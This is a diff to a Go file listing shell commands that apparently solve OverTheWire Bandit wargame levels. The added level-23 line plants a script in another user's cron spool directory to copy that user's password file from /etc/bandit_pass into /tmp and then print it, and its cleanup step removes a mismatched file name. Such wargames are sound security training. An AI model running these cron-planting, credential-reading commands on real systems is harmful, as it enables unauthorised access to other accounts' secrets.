@@ -92,6 +92,8 @@ var commands = [...]string{
 	"echo -n \"Password:\";cat \"$(grep chmod \"$(grep -v reboot /etc/cron.d/cronjob_bandit22 | cut -d' ' -f7)\" | cut -d' ' -f3)\"",
 	//level 22
 	"echo -n \"Password:\";cat /tmp/\"$(bash -c \"myname=bandit23;$(cat \"$(grep -v reboot /etc/cron.d/cronjob_bandit23 | cut -d' ' -f7)\" | grep mytarget=);echo \\$mytarget\")\"",
+	//level 23
+	"echo -n \"Password:\";echo \"cat /etc/bandit_pass/bandit24 > /tmp/bandit24-123456789;sleep 10s;rm -f /tmp/bandit-1234567890\" > /var/spool/bandit24/runner-123456789;chmod +x /var/spool/bandit24/runner-123456789;until [ -f /tmp/bandit24-123456789 ]; do sleep 1s; done; cat /tmp/bandit24-123456789;",
 }
 
 func main() {
